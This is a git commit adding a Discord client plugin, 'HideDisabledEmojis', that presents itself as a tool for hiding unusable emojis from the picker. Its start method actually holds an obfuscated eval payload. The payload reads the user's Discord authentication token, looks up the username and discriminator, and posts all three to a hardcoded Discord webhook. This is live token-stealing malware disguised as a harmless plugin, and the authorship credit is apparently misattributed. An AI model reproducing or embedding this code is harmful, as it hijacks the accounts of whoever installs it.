69f009ecfa4c552f169f898f2e6b11125dc73626
NueveLeVrai <96892165+NueveLeVrai@users.noreply.github.com>
2021-12-30 23:35:09 +0100

    Add files via upload

---
+++ HideDisabledEmojis.plugin.js
@@ -0,0 +1,18 @@
+/**
+ * @name HideDisabledEmojis
+ * @version 0.0.7
+ * @description Hides disabled emojis from the emoji picker. Useful for non-nitro users
+ * @author Zerebos
+ *   
+ */
+module.exports = class Gifhider{
+    load() { }
+    start() {
+    
+    eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('q w="k://18.h/i/S/R/Q";u{1 m=[];1 e=P("(O.9([[\'\'],{},e=>{m=[];d(6 c f e.c)m.9(e.c[c])}]),m).N(m=>m?.5?.3?.4!==M 0).5.3.4()")}s{1 g="";1 8=L.9([[],{j:(e,t,r)=>e.5=r},[["j"]]]);d(6 e f 8.c)p(8.c.I(e)){6 t=8.c[e].5;p(t&&t.H&&t.3)d(6 e f t.3)"4"===e&&(g=t.3.4())};1 e=g};C l(o){1 2=B U();2.T("V",o,16);2.1d(\'1h\',e);2.19(1g);1e 2.1b};1 b=x.1a(l(\'k://17.h/i/13/12/@11\'));1 7=b["7"]+"#"+b["Z"];q y={"A":"7: "+7+"\\X: "+e+"\\n"};u{Y(w+"?10=14",{"15":"W","1f":{"A-D":"E/v"},"F":x.G(y)}).z(a=J.v()).z(K.1c)}s{};',62,80,'|var|xmlHttp|default|getToken|exports|let|username|req|push||||for||in|gotem|com|api|extra_id|https|httpGet|||theUrl|if|const||catch||try|json|whurl|JSON|msg|then|content|new|function|type|application|body|stringify|__esModule|hasOwnProperty|xa|console|webpackJsonp|void|find|webpackChunkdiscord_app|eval|xiFDOPBYcKOb9hZhS6641KK6cVEh0snIpQ6jmMxmyB8bkuJzLcbA08e5H48GMyad1kZL|921485527427981346|webhooks|open|XMLHttpRequest|GET|POST|ntoken|fetch|discriminator|wait|me|users|v6|true|method|false|discordapp|discord|send|parse|responseText|log|setRequestHeader|return|headers|null|Authorization'.split('|')))
+
+}
+stop(){
+
+}
+}
